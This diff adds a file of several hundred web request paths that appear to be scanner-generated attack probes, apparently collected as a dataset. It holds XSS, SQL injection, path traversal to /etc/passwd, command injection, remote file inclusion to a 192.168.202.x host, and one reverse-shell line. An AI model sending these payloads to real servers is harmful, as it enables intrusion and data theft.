@@ -1,0 +1,2000 @@
+/top.php?stuff='uname >q36497765 #
+/h21y8w52.nsf?<script>cross_site_scripting.nasl</script>
+/ca000001.pl?action=showcart&hop=\"><script>alert('vulnerable')</script>&path=acatalog/
+/scripts/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id; 
+/javascript/mta.exe
+/examples/jsp/colors/kernel/loadkernel.php?installpath=/etc/passwd\x00
+/examples/jsp/cal/feedsplitter.php?format=../../../../../../../../../../etc/passwd\x00&debug=1
+/phpwebfilemgr/index.php?f=../../../../../../../../../etc/passwd
+/cgi-bin/script/cat_for_gen.php?ad=1&ad_direct=../&m_for_racine=</option></select><?phpinfo();?>
+/examples/jsp/cal/search.php?allwords=<br><script>foo</script>&cid=0&title=1&desc=1
+/moodle/filter/tex/texed.php?formdata=foo&pathname=foo"+||+echo+db+4d+5a+50+00+02+00+00+00+04+00+0f+00+ff+ff+00+00+b8+00+00+00+00+00+00+00+40++>>esbq
+/examples/jsp/colors/workarea/contentdesigner/ekformsiframe.aspx?id="><script>alert('nessus')</script>
+/id;1627282494;fp;2;fpid;1/
+/<img src="javascript:alert(cross_site_scripting.nasl);">.do
+/bmeun223.exe?<meta http-equiv=set-cookie content="testhhwu=7044">
+/htbin/windmail.exe
+/<script>document.cookie="testrluj=1420;"</script>
+/javascript/.passwd.jpg
+/opensiteadmin/scripts/classes/databasemanager.php?path=http://192.168.202.118:8080/ghl9il?\x00
+/examples/jsp/jsp2/el/search=<script>alert('xss')</script>
+/javascript/signer.exe
+/help.php?q="&del\x0bq26193259&rem\x0b
+/c'hoario\xc3\xb9/
+/main.php?logout="&del\x0cq31768299&rem\x0c
+/\xd0\x97\xd0\xb4\xd0\xbe\xd1\x80\xd0\xbe\xd0\xb2'\xd1\x8f/
+/themes/modern/user_style.php?user_colors[bg_color]="</style><script>alert(411136083423)</script>
+/nyjgaorz.mscgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/cgi-bin/index.php?op=default&date=200607' union select 1,501184215,1,1,1,1,1,1,1,1--&blogid=1
+/scripts/cfooter.php3
+/en-us/dda2qr7j.fts?<script>cross_site_scripting.nasl</script>
+/?<meta http-equiv=set-cookie content="testpokn=7494">
+/169okeyj.jspa?<meta http-equiv=set-cookie content="testxeoi=3573">
+/j734qobz.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/error/forum.php?do=viewtopic&cat=1&topic=1&page=1?<script>foo</script
+/post.asp?method=topic&forum_id=1&cat_id=1&type=wvs-xss-magic-string-410025568136
+/ows-bin/windmail.exe
+/manager/secure.php?cfgprogdir=/etc/passwd\x00
+/debug/showproc?proc===<script>alert('vulnerable');</script>
+/<script>document.cookie="testnvxc=4301;"</script>
+/cacti/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331905098')</script>
+/scripts/comersus_customerregistrationform.asp
+/cgi-bin/search.pl?form=../../../../../../etc/passwd\x00
+/help.php?q='uname >q23433168 #
+/u8yiqilu.jsp?<meta http-equiv=set-cookie content="testswjp=6010">
+/scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1376526276--
+/core/adodb/server.php?sql='adodb_sql_sql_injection.nasl
+/xsqln7eb.aspx?<meta http-equiv=set-cookie content="testpcbb=9254">
+/u8yiqilu.dll?<script>document.cookie="testswjp=6010;"</script>
+/5o9zq43e.cfm?<script>cross_site_scripting.nasl</script>
+/manager/cgi/tseekdir.cgi?location=/etc/passwd\x00
+/qhvu0pdg.fts?<meta http-equiv=set-cookie content="testchuc=2100">
+/scripts/lsg2.cgi
+/1r8cfrlf.exe?<script>document.cookie="testydan=5106;"</script>
+/scripts/misc/audio.php?recording=../version.inc
+/javascript/.passwd.php3
+/<script>cross_site_scripting.nasl</script>.idc
+/learnvbscript/
+/main.php?logout="\x0duname #
+/recordings/usrdetails.php?sgnuptype=csaleid<script>nessus</script>
+/javascript/emea.exe
+/8t9v8k7x.exe?<script>document.cookie="testhvje=9403;"</script>
+/examples/jsp/error/include/error/autherror.cfm?errorcode=1&ftvar_linkp="></a><script>alert('fusetalk_mult_xss.nasl')</script><a href="
+/en-us/oie504mr.jspa?<meta http-equiv=set-cookie content="testtpby=7052">
+/examples/jsp/colors/bb-hostsvc.sh?hostsvc=../../../../../etc/passwd
+/cgi-bin/type.asp?itype='duware_itype_sql_injection.nasl
+/help.php?q="del q66737251 #
+/dslpwt15.fts?<script>document.cookie="testtkio=5454;"</script>
+/lsoix5h3.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/chef's_knives/
+/starnet/addons/slideshow_full.php?album_name='288150554
+/examples/jsp/num/index.php?id='union/**/select/**/0,0,1369222205,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+/scripts/search.scr.php?globals[pth][classes]=http://192.168.202.118:8080/tzhfyzkbomspvm??
+/mpcgi/apexec.pl?etype=odp&passurl=/category/&template=../../../../../../../../../../etc/passwd\x00.html
+/main.php?logout="rm q61955456&rem 
+/scripts/w04ukbv54ixz.cfm
+/postscriptbarcode/
+/javascript/htpasswd.exe
+/javascript/mod.exe
+/containsscript/
+/help.php?q=;del q94314237 #
+/scripts/alienform.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd
+/tera patrick - farmer's daughter/
+/cgi-sys/a1stats/a1disp3.cgi?../../../../../../../../../../etc/passwd
+/bxnyrhmh.cgi?<script>document.cookie="testmjct=1867;"</script>
+/scripting languages/
+/cgi-local/a1disp3.cgi?../../../../../../../../../../etc/passwd
+/bxnyrhmh.cfc?<script>document.cookie="testmjct=1867;"</script>
+/javascript/warez.exe
+/scs86g1p.cfm?<meta http-equiv=set-cookie content="testquyx=2820">
+/scripts/search.scr.php?globals[pth][classes]=http://192.168.202.96:8080/4dckqcc0acprbz??
+/tuwjta1w.x?<script>document.cookie="testpokn=7494;"</script>
+/pirvate/ltwpdfmonth.php?ltw_config['include_dir]=http://192.168.202.118:8080/ghl9il?
+/cacti/javascript.php?abs_path=/etc/passwd\x00
+/en-us/n9xlumt5.x?<script>cross_site_scripting.nasl</script>
+/bb-hist.sh?histfile=../../../../../etc/passwd
+/cgi-bin/view_user.php?list=1&letter=&sort_by='select
+/<script>document.cookie="testggad=2000;"</script>
+/scripts/readme.txt
+/ybz5rz7a.pl?<script>document.cookie="testsbvw=6289;"</script>
+/javascript/backup.exe
+/javascript/htpasswd.cgi
+/phpmyadmin/documentation.html?phpmyadmin=csc3t31gos8q2h30o9cfk567d1lu5go1;/bin/id
+/rv98iwjp.php?<script>cross_site_scripting.nasl</script>
+/scripts/forum.php?do=viewtopic&cat=1&topic=1&page=1?<script>foo</script
+/cgi-bin/starnet/addons/slideshow_full.php?album_name='401935065
+/y8pmygrp.exe?<script>cross_site_scripting.nasl</script>
+/top.php?stuff=';uname >q64815511 #
+/xfkun1ku.jspa?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/checkbox/bandwidth/index.cgi?action=showmonth&year=<script>foo</script>&month=<script>foo</script>
+/oie504mr.cfc?<meta http-equiv=set-cookie content="testtpby=7052">
+/opensiteadmin/scripts/classes/filter.php?path=http://192.168.202.96:8080/swgnhpydbq0t?\x00
+/manager/index.php?selskin=../inc/boxleft.inc\x00&xposbox[l][]=/etc/passwd\x00
+/iktok2bw.cfm?<script>cross_site_scripting.nasl</script>
+/help.php?q=del;q81588837&rem;
+/en-us/dda2qr7j.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/~eric.exe
+/scripts/apps/pbcs.dll/misc?url=../../../../../../../../../../../../boot.ini
+/cgi-914/webbbs/webbbs_config.pl?body=aaaaffff&email=test@example.com&followup=10;cat /etc/passwd&name=joe
+/manager/loudblog/inc/parse_old.php?template=@system(id);@&php_use=1&phpseparator=@
+/acart2_0/signin.asp?msg=<script>alert(\"test\")</script>
+/cgi-bin/inc/formmail.inc.php?script_root=../templates/mail.tpl.txt\x00
+/read.php?pagenum_rsread=1&totalrows_rsread=<script>alert('wvs-xss-magic-string-414685599129')</script>
+/help.php?q='rm\x09q87915929\x09#
+/recordings/calendar.php?serverpath=/etc/passwd\x00
+/javascript/hardcore.exe
+/examples/servlets/servlet/ovlaunch.exe
+/d765w06j.cfm?<script>cross_site_scripting.nasl</script>
+/javascript/scripts.exe
+/i686v90l.cgi?<script>document.cookie="testfutf=1550;"</script>
+/ywaxntrx.do?<img src="javascript:alert(cross_site_scripting.nasl);">
+/phpmyadmin/doc/index.php?s=/etc/passwd\x00
+/scriptssearch_results.dot?search_query=nessus"><script>alert('dotcms_search_query_xss.nasl')</script>/
+/scripts/neomail-prefs.pl?sessionid=nessus-session-0.neomail_sessionid_validation.nasl&action=addfolder&foldername=mbt7mplpoxxxq5dko
+/javascript/program files.exe
+/manager/xaradodb/server.php?sql='adodb_sql_sql_injection.nasl
+/syshelp/cscript/showfunc.stm?func=<script>alert(document.cookie)</script>
+/l4fz1dqw.nsf?<script>cross_site_scripting.nasl</script>
+/if69ddo1.php3?<meta http-equiv=set-cookie content="testiabz=5220">
+/main.php?stuff="&ping\xa0-w\xa07000\xa0-n\xa01\xa01.2.3.4&rem\xa0
+/top.php?stuff=;sleep 7 #
+/?<script>document.cookie="testqppc=8767;"</script>
+/scripts/index.php?op=viewarticle&articleid=9999/**/union/**/select/**/1331905182,1,1,1,1,1,1,1--&blogid=1
+/scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 2020390524,2,880987929,4,5,6,7,8,9,0,1,2,3 --
+/main.php?logout=ver,>q12148819&rem,
+/ny1b3qq4.x?<img src="javascript:alert(cross_site_scripting.nasl);">
+/main.php?stuff='&sleep\x0910\x09#
+/scripts/eezuu7xc7ge3.php3
+/ovcgi/webappmon.exe?ins=nowait&sel=localhost&act=ping
+/7uz3ok60.htm?<script>cross_site_scripting.nasl</script>
+/top.php?stuff="sleep\x099\x09#
+/scripts/index.php?board=nonexistant1465558133
+/d44uk9h2.exe?<script>document.cookie="testmybc=2088;"</script>
+/index.php?include_files[]=&include_files[query_string]=/etc/passwd
+/awstatstotals.php?sort={${phpinfo()}}{${exit()}}
+/help.php?q=ping;-w;11000;-n;1;1.2.3.4|rem;
+/tukodz3j.fts?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1164366855--
+/ht8pn8uq.idc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/yver8r9o.kspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/cgi-bin/starnet/addons/slideshow_full.php?album_name='1273136253
+/examples/jsp/checkbox/login.php?user="><script>alert('pubcookie_xss.nasl');</script>
+/qhvu0pdg.dll?<meta http-equiv=set-cookie content="testchuc=2100">
+/javascript/webbbs.exe
+/<meta http-equiv=set-cookie content="testjvvf=7721">
+/boilerplate.asp?nfuse_template=.../.../.../.../.../.../.../.../.../boot.ini&nfuse_currentfolder=/
+/scripts/vhost.php?action=logout&time=1331919067
+/examples/jsp/cal/dcforum.cgi?az=list&forum=../../../../../../../etc/passwd\x00
+/bzuf9ozq.pl?<script>cross_site_scripting.nasl</script>
+/cgi-bin/directorypro.cgi?want=showcat&show=../../../../../../../../../../etc/passwd\x00
+/interface/login/login_frame.php?site=<script>alert(owasp zap);</script> and 1=1
+/cgi-bin/error.php?selected_theme=<script>alert(uebimiau_selected_theme_xss.nasl)</script>
+/scripts/default.asp
+/examples/jsp/num/contenido/classes/class.inuse.php?cfg[path][contenido]=/etc/passwd\x00
+/oie504mr.htm?<script>document.cookie="testtpby=7052;"</script>
+/examples/jsp/jsp2/jspx/activatemember?activatecode=&member="><script>alert('mvnforum_activatemember_xss.nasl')</script>
+/en-us/account/workarea/contentdesigner/ekformsiframe.aspx?id="><script>alert('nessus')</script>
+/subscriptionservices/
+/scripts/index.php?getapplication=register&checknum=1&args=null
+/vjbrrppi.fts?<script>cross_site_scripting.nasl</script>
+/cacti/download.php?language=/etc/passwd\x00
+/phpmyadmin/k/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor
+/phpmyadmin/view_user.php?list=1&letter=&sort_by='select
+/javascript/debug.exe
+/scripts/udblphlq4nln.sh
+/chief's message on violence against women/
+/cacti/js/vendors.php?file=../../../../../../../../../../etc/passwd\x00nessus.js
+/scripts/qg9h0c0svvat.shtml
+/examples/jsp/jsp2/jspx/view_user.php?list=1&letter=&sort_by='select
+/cgi-bin/perl.exe?-v
+/projects/1/repository/annotate?rev=`0<&186-;exec 186<>/dev/tcp/192.168.202.118/17246;sh <&186 >&186 2>&186`
+/ka'roo/
+<script>document.cookie="testrluj=1420;"</script>
+/javascript/maestro.exe
+/top.php?stuff='&sleep 9 #
+/cacti/setcookie.php?u=../../../../../../../../../../../../etc/passwd\x00&plugin=pblang_mult_flaws.nasl
+/javascript/vendors.exe
+/scripts/tree.php
+/subscriptions.yml
+/scripts/4rzefq7dsowk.pl
+/help.php?q="\x0auname\x09>q72938489\x09#
+/pwcgi/smpwservicescgi.exe?target=http://www.nessus.org
+/javascript/bfc.exe
+/cgi-bin/rss.php?blogid=1&profile=../../config/config.properties.php\x00
+/cacti/include/doc/get_image.php?lang=en&img=../../../../../../../../../../etc/passwd
+/snmx-cgi/fxm.exe
+/descriptious/
+/main.php?stuff="ping\x0b-w\x0b11000\x0b-n\x0b1\x0b4.3.2.1&rem\x0b
+/manager/lang/index.php?file=/etc/passwd
+/cgi-bin/generate.cgi?content=../../../../../../../../../../windows/win.ini\x00board=board_1
+/o35zot2r.cfm?<script>cross_site_scripting.nasl</script>
+/scripts/inc/pipe.php?hcl_path=http://xxxxxx./
+/prescription-ultram/
+/t7tm4m0b.cfc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/phpmyadmin/index.php?op=default&date=200607' union select 1,1265182078,1,1,1,1,1,1,1,1--&blogid=1
+/en-us/33y9gcqq.jspa?<meta http-equiv=set-cookie content="testnvxc=4301">
+/ao22ww7y.cfm?<script>document.cookie="testqppc=8767;"</script>
+/top.php?stuff=&ver\x0b>q21316317&rem\x0b
+/6dlc2zm9.asp?<script>document.cookie="testqpux=4016;"</script>
+/scripts_help/
+/feedsplitter.php?format=../../../../../../../../../../etc/passwd\x00&debug=1
+/iajtej82.dll?<img src="javascript:alert(cross_site_scripting.nasl);">
+/main.php?logout="|ping\x0c-w\x0c8000\x0c-n\x0c1\x0c1.2.3.4|rem\x0c
+/javascript/.passwd.db
+/rpxyx07v.do?<meta http-equiv=set-cookie content="testbnli=1975">
+/o35zot2r.exe?<script>cross_site_scripting.nasl</script>
+/scriptsfaq.php?skin=../../admin/manager&tplpath=admin
+/ygkjkngd.cfc?<script>document.cookie="testnago=4518;"</script>
+/unix-scripts/
+/d44uk9h2.exe?<meta http-equiv=set-cookie content="testmybc=2088">
+/top.php?stuff=&rm;q25243259&rem;
+/<meta http-equiv=set-cookie content="testqppc=8767">
+/cgi-bin/sawmill6cl.exe?ho+{complete_version}
+/scriptaculous/
+/t7tm4m0b.php3?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/recorder.exe
+/scripts/contenido/classes/class.inuse.php?cfg[path][contenido]=/etc/passwd\x00
+/scripts/rx9ysf2iwv4j.cfm
+/cgi-bin/index.php?gadget=glossary&action=viewterm&term=<script>alert('jaws_xss.nasl');</script>
+/scs86g1p.aspx?<meta http-equiv=set-cookie content="testquyx=2820">
+/bxnyrhmh.dll?<meta http-equiv=set-cookie content="testmjct=1867">
+/examples/jsp/colors/index.php?show=../../../../../../../../../../../etc/passwd\x00
+/zuihld5m.html?<img src="javascript:alert(cross_site_scripting.nasl);">
+/l13b77e5.nsf?<script>document.cookie="testjvvf=7721;"</script>
+/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+777+/tmp/cgeqvnsxdv.sh'); function v
+/cgi-binsearch-results.dot?search_query=nessus"><script>alert('dotcms_search_query_xss.nasl')</script>/
+/top.php?stuff=';uname >q38627655 #
+/examples/jsp/sessions/edit_image.php?dn=1&userfile=/etc/passwd&userfile_name= ;id; 
+/top.php?stuff="&rm\x0cq55426988&rem\x0c
+/javascript/traces.exe
+/0qhcnefz.kspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/xampp/phonebook.php?lastname=',acunetix())/*&firstname=1
+/iv5vkgam.php?<meta http-equiv=set-cookie content="testfosd=94">
+/igtf0zon.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/en-us/oie504mr.dll?<meta http-equiv=set-cookie content="testtpby=7052">
+/bzuf9ozq.kspx?<script>cross_site_scripting.nasl</script>
+/recordings/module.php?module=osticket&file=../../../../../../../../../../../etc/passwd
+/help.php?q="&ver&rem 
+/169okeyj.html?<meta http-equiv=set-cookie content="testxeoi=3573">
+/openautoclassifieds/friendmail.php?listing=<script>alert(document.domain);</script>
+/administrator/gallery/navigation.php?directory=\"<script>alert(document.cookie)</script>
+/en-us/h5sc3gxy.nsf?<script>cross_site_scripting.nasl</script>
+/cacti/atomicboard/index.php?location=../../../../../../../../../../../../../../../etc/passwd
+/en-us/dda2qr7j.cfc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/num/pfdispaly.cgi?../../../../../../etc/passwd
+/smpwservicescgi.exe
+/javascript/feeds.exe
+/moodle/filter/tex/texed.php?formdata=foo&pathname=foo";ls+-l;rm+/tmp/pcousamoyu"
+/cgi-bin/traffic.cgi?cfg=../../../../../../../../etc/passwd
+/i7prbs22.cgi?<meta http-equiv=set-cookie content="testjnre=7328">
+/b5xdqgz2.do?<img src="javascript:alert(cross_site_scripting.nasl);">
+/examples/jsp/checkbox/admin/admin.php?sid='
+/nmw0do67.exe?<img src="javascript:alert(cross_site_scripting.nasl);">
+/scripts/_xuzlr7swn95.php3
+/ghswfouu.cfc?<script>document.cookie="testsqmm=5713;"</script>
+/cgi-binsearch_results.dot?search_query=nessus"><script>alert('dotcms_search_query_xss.nasl')</script>/
+/examples/jsp/checkbox/rot13sj.cgi?/etc/passwd
+/scripts/gwweb.exe?help=bad-request
+/cgi/query?mss=../config
+/t7tm4m0b.nsf?<script>cross_site_scripting.nasl</script>
+/superduperdescription/
+/manager/library/adodb/server.php?sql='adodb_sql_sql_injection.nasl
+/javascript/bank.exe
+/3hlysl2x.cfc?<script>document.cookie="testgjbe=8505;"</script>
+/iktok2bw.cfc?<script>cross_site_scripting.nasl</script>
+/cacti/cgiforum.pl?thesection=../../../../../../../../etc/passwd\x00
+/htbin/a1disp3.cgi?../../../../../../../../../../etc/passwd
+/examples/jsp/sessions/help.php?section='qualiteam_xcart_sql_xss.nasl
+/606wkcop.php?<script>cross_site_scripting.nasl</script>
+/examples/servlets/servlet/admin/admin.php?sid=0'
+/cgi-bin/index.php?src=1&_common=1&time=1331919011&action=show_view&module=calendarmodule&view=../../../../../../../../../../etc/passwd\x00
+/include/default_header.php?script_path=http://192.168.202.118:8080/tzhfyzkbomspvm?
+/server.pt?open=space&name=";}</script><script>alert('plumtree_name_xss.nasl')</script>
+/7u1pb2xi.html?<meta http-equiv=set-cookie content="testlwwz=718">
+/examples/servlets/servlet/home?dir=/&file=../../../../../../../../../../../../etc/passwd&lang=kor
+/javascript/foo.exe
+/scripts/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331904208')</script>
+/fcgi-bin/fileseek.cgi?foot=&head=;cat /etc/passwd|
+/eg2u8pbv.htm?<script>cross_site_scripting.nasl</script>
+/help.php?q="&del\x0cq93118475&rem\x0c
+/xoops232b/htdocs/xoops_lib/modules/protector/onupdate.php?mydirname=a(){}system('chmod+555+/tmp/zffcwqffhn0;'); function v
+/javascript/loading.exe
+/scripts/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331908785&lang_crm=../../vtigerservice.php\x00
+/cgi-bin/www/delivery/ac.php?bannerid=-1331904183+or+1=1+--+';passthru(base64_decode($_server[http_nessus_0oywsnwb]));die;/*
+/cwmail.exe
+/main.php?stuff=;del q92696358 #
+/scripts/ws_ftp.ini
+/x2gyorli.do?<script>document.cookie="testwhac=3130;"</script>
+/9o6g5vkn.cfc?<script>cross_site_scripting.nasl</script>
+/templates/admin/login_form.php?msg_login=<script>alert("force_xss")</script>
+/scripts/sendcard.php?view=1&id='sendcard_sql.nasl
+/msadm/domain/index.php3?account_name=\"><script>alert('vulnerable')</script>
+/examples/jsp/cal/phprint.php?module=vtiger_lang_crm_lfi.nasl&action=1331904365&lang_crm=../../../../../../../../../../../..//etc/passwd\x00
+/jw64yq8u.aspx?<meta http-equiv=set-cookie content="testylfu=1313">
+/zv8tv7h8.php3?<meta http-equiv=set-cookie content="testcqwz=9752">
+/javascript/.htaccess///skipfish.invalid/;?
+/index.php?_language=../../../../../../../../../../etc/passwd\x00
+/m4kkjf8l.dll?<meta http-equiv=set-cookie content="testyglc=8988">
+/main.php?logout=;rm\x09q14218261\x09#
+/scripts/?cmd=config
+/cacti/simple/view_page?mv_arg=|cat /etc/passwd|
+../../../../../../../../../../etc/passw*
+/cgi-bin/logbook.pl?file=../../../../../../../../../../bin/cat /etc/passwd\x00|
+/en-us/account/whois.cgi?action=load&whois=;id
+/cgi-bin/a1stats/a1disp3.cgi?../../../../../../../../../../etc/passwd
+/scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332009305',null,null,null,null --
+fi?/etc/passwd
+/top.php?stuff=1 '" -- 
+/en-us/<script>cross_site_scripting.nasl</script>.php
+/ca/..\\..\\..\\..\\..\\..\\/\\etc/\\passwd
+/opensiteadmin/scripts/classes/formmanager.php?path=http://192.168.202.118:8080/zz5thkvtmlgl?\x00
+/cgi-bin/index.php?id=_pb9wansu9'
+/cgi-bin/dataservice.asmx/authuser?username='nessus1331919210&password=nasl&needcompress=0
+/sys/code/box.inc.php?config["sipssys"]=http://192.168.202.118:8080/moclyxlwqyfjnp?
+/recordings/lib/owl_api.php?xrms_file_root=../../../../../../../../../../../../etc/passwd\x00
+/main.php?logout='&uname >q16695623 #
+/adodb-perf-module.inc.php?last_module=zzz_adoconnection{}system(id);class zzz_adoconnection{}//
+/javascript/.passwd.py
+/cgi-bin/webappmon.exe?ins=nowait&act=natping&sel="255.255.255.255 & id&"
+/help.php?q=\x0auname\x09>q27637243\x09#
+/javascript/mark.exe
+/bxnyrhmh.php?<script>document.cookie="testmjct=1867;"</script>
+/news.php?scriptpath=http://192.168.202.118:8080/2aibfaczmac8??
+/examples/jsp/checkbox/faxsurvey?cat /etc/passwd
+/0z575z74.do?<meta http-equiv=set-cookie content="testuhsv=9753">
+/s7qus4g3.x?<script>cross_site_scripting.nasl</script>
+/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/etc/passwd\x00
+/main.php?logout="rm;q97754931&rem;
+/qb2xy9aw.cfc?<img src="javascript:alert(cross_site_scripting.nasl);">
+/ihd231-xss/
+/examples/jsp/colors/detail.asp?nchannel='1
+/ddoworrl.cfc?<script>document.cookie="testvlau=8517;"</script>
+/en-us/s7qus4g3.cgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/hrttz9fj.php3?<meta http-equiv=set-cookie content="testtbjy=7334">
+/javascript/developers.exe
+/javascript/bio.exe
+/phpmyadmin/af.cgi?_browser_out=.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./.|./etc/passwd
+/b5xdqgz2.php?<img src="javascript:alert(cross_site_scripting.nasl);">
+/phpmyadmin/documentation.html?phpmyadmin="><img src=1 onerror=javascript:alert(205)>
+/nuh3zirz.kspx?<script>cross_site_scripting.nasl</script>
+/n9xlumt5.pl?<script>cross_site_scripting.nasl</script>
+/fmnveedu.htm?<script>document.cookie="testgfbr=7014;"</script>
+/daddy's little princess - scene 2/
+//<body><script src=http://www.example.com/test?rnd=q91324775></script>
+/scripts/mundimail/template/simpledefault/admin/_masterlayout.php?top=http://cirt.net/rfiinc.txt?
+/jdx255ea.fts?<meta http-equiv=set-cookie content="testziyq=5055">
+/examples/servlets/servlet/_head.php?_zb_path=../../../../../../../../../../etc/passwd\x00
+/examples/jsp/error/wordtrans.php?command=show_desc&advanced=1";id; true "
+/scripts/bpk_bsfe_4vq.html
+/scripts/cmslogin.aspx
+/cgi-915/sensepost.exe?/c+dir
+/cgi-local/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd
+/opensiteadmin/scripts/classes/fieldmanager.php?path=http://192.168.202.96:8080/swgnhpydbq0t?\x00
+/<script>cross_site_scripting.nasl</script>.exe
+/javascript/purchasing.exe
+/piranha/secure/passwd.php3
+/help.php?q=ver\x09>q72339979&rem\x09
+/main.php?stuff="\x0auname #
+/ap58k3ci.cgi?<img src="javascript:alert(cross_site_scripting.nasl);">
+/dda2qr7j.fts?<img src="javascript:alert(cross_site_scripting.nasl);">
+/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331908736,1948616015 -- 
+/ygkjkngd.cgi?<meta http-equiv=set-cookie content="testnago=4518">
+/examples/jsp/colors/search.cgi?..\..\..\..\..\..\winnt\win.ini
+/top.php?stuff="\x0arm\x09q52122221\x09#
+/um7xpn15.fts?<meta http-equiv=set-cookie content="testotoy=6142">
+/en-us/fo564rei.asp?<img src="javascript:alert(cross_site_scripting.nasl);">
+/admin/news.admin.php?path_to_script=http://192.168.202.96:8080/whmch8ftkt7kv??&cmd=ls
+/javascript/to.exe
+/m4kkjf8l.exe?<meta http-equiv=set-cookie content="testyglc=8988">
+/scripts/gdxlwjnlsr6i.php3
+/eei78ore.cgi?<script>cross_site_scripting.nasl</script>
+/examples/jsp/num/index.php?page=/etc/passwd\x00
+/5qnlm5z2.dll?<meta http-equiv=set-cookie content="testsixi=8451">
+/fcgi-bin/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd
+/scripts/kfzqb5x87lvq.php3
+/b4vng02k.asp?<script>document.cookie="testtrlh=3672;"</script>
+/scripts/item.fts?href="><script>alert("ftgate_44002.nasl")</script>;
+/scripts/test11.asp
+/main.php?stuff="\x0adel\x09q74494385\x09#
+/?<script>document.cookie="testwldz=3506;"</script>
+/en-us/account/index.php?id='
+/cgi-915/pfdisplay.cgi?'\x0a/bin/cat /etc/passwd|'
+/phpmyadmin/htsearch?exclude=`/etc/passwd`
+/fc9t54l7.jsp?<meta http-equiv=set-cookie content="testggad=2000">
+/forum1_professionnel.asp?n=1771&amp;nn=100&amp;page=/..../boot.ini
+/admin/doeditconfig.php?thispath=../includes&config[path]=http://192.168.202.118:8080/moclyxlwqyfjnp?
+/examples/jsp/jsp2/jspx/starnet/addons/slideshow_full.php?album_name='2005084173
+/javascript/benefits.exe
+/hrttz9fj.exe?<meta http-equiv=set-cookie content="testtbjy=7334">
+/top.php?stuff=&ver\xa0>q92247843&rem\xa0
+/scripts/kernel/loadkernel.php?installpath=/etc/passwd\x00
+/h21y8w52.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+ftp://192.168.24.253/*<apache_mod_proxy_ftp_glob_xss.nasl>
+/l752x1ry.kspx?<img src="javascript:alert(cross_site_scripting.nasl);">
+/search.jsp?q=%"<script>alert(1331909235)</script>
+/www/delivery/ac.php?bannerid=-1332009302+or+1=1+--+';passthru(base64_decode($_server[http_nessus_dllvu4k6]));die;/*
+/en-us/account/index.php?id='union/**/select/**/0,0,1647791366,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
+/examples/servlets/servlet/includes/converter.inc.php?include_path=/etc/passwd\x00
+/help.php?q='sleep 8 #
+/iktok2bw.fts?<img src="javascript:alert(cross_site_scripting.nasl);">
+/javascript/~ftp.exe
+/sprotectlinux/showpage.cgi?page=../html/splx_main.htm
+/help.php?q="&ping -w 8000 -n 1 1.2.3.4&rem 
+/emailfriend/emailarticle.php?id=\"<script>alert(document.cookie)</script>
+/javascript/document.bat
+/static//\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xae\xc0\xaeetc/passwd
+/6dlc2zm9.do?<script>document.cookie="testqpux=4016;"</script>
+/base_local_rules.php?dir=<script>alert('base_local_rules_xss.nasl-1331919174')</script>
+/ju0u7kfo.jsp?<script>cross_site_scripting.nasl</script>
+/examples/jsp/security/protected/j_security_check;jsessionid=5680ad1b9956cf0a8a9f08a20f983ee6~
+<script>document.cookie="testjvvf=7721;"</script>
+/egaet53a.jspa?<img src="javascript:alert(cross_site_scripting.nasl);">
+/top.php?stuff=ver;>q99348313&rem;
+/recordings/pmwiki.php?globals[farmd]=/etc/passwd\x00
+/examples/jsp/error/pfdispaly.cgi?../../../../../../etc/passwd
+/bin/a1disp3.cgi?../../../../../../../../../../etc/passwd
+/ewc3rz1l.idc?<meta http-equiv=set-cookie content="testkgqo=204">
+/en-us/dda2qr7j.jspa?<img src="javascript:alert(cross_site_scripting.nasl);">
+/m4kkjf8l.asp?<script>document.cookie="testyglc=8988;"</script>
+/mpcgi/ion-p?page=../../../../../etc/passwd
+/examples/jsp/checkbox/index.php?cat='
+/h4bi26jd.aspx?<script>document.cookie="testhrzx=1150;"</script>
+/examples/jsp/colors/add_url.htm?node=<script>alert('xss')</script>
+/subscriptions.jpg
+/t578vqea.htm?<script>document.cookie="testsory=7676;"</script>
+/examples/jsp/error/ttawebtop.cgi/?action=start&pg=../../../../../../../../../../../etc/passwd
+/javascript/htpasswd.py
+/scripts/index.php?board=nonexistant674192050
+/coin_includes/constants.php?_ccfg[_pkg_path_incl]=/etc/passwd\x00
+/top.php?stuff=ver\x0b>q75783184&rem\x0b
+/scripts/9pen4xzgztjn.sh
+/examples/jsp/checkbox/index.php?id=0rop9yeuxw'
